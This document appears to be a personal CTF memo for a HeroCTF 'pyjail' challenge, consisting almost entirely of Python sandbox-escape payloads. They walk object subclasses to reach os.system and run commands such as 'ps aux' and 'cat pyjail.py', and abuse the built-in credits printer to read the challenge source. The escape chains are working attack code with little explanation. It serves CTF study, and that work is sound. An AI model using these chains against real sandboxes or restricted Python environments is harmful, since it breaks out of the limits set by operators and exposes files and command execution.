"""
pyjail
---
https://graneed.hatenablog.com/entry/2018/09/09/020759

STREAMRW = 109
().__class__.__bases__[0].__subclasses__()[109].__init__
().__class__.__bases__[0].__subclasses__()[109].__init__.__globals__['sys']
().__class__.__bases__[0].__subclasses__()[109].__init__.__globals__['sys'].modules['os']
().__class__.__bases__[0].__subclasses__()[109].__init__.__globals__['sys'].modules['os'].system("pwd")
().__class__.__bases__[0].__subclasses__()[109].__init__.__globals__['sys'].modules['os'].system("ls -l /")
().__class__.__bases__[0].__subclasses__()[109].__init__.__globals__['sys'].modules['os'].system("ls -l")
().__class__.__bases__[0].__subclasses__()[109].__init__.__globals__['sys'].modules['os'].system("cat pyjail.py")

print(().__class__.__bases__[0].__subclasses__()[109].__init__.__globals__['sys'].modules['os'].system("cat entry.sh"))

print(().__class__.__bases__[0].__subclasses__()[109].__init__.__globals__['sys'].modules['os'].system("cat pyjail.py"))

print(().__class__.__bases__[0].__subclasses__()[109].__init__.__globals__['sys'].modules['os'].system("ps aux"))

---
HeroCTF の Discord に挙がっていた解法
https://discord.com/channels/613165483910234131/979809378263789679/1107418652891955240
print.__self__.setattr(print.__self__.credits, "_Printer__filenames", ["pyjail.py"]),print.__self__.credits()


"""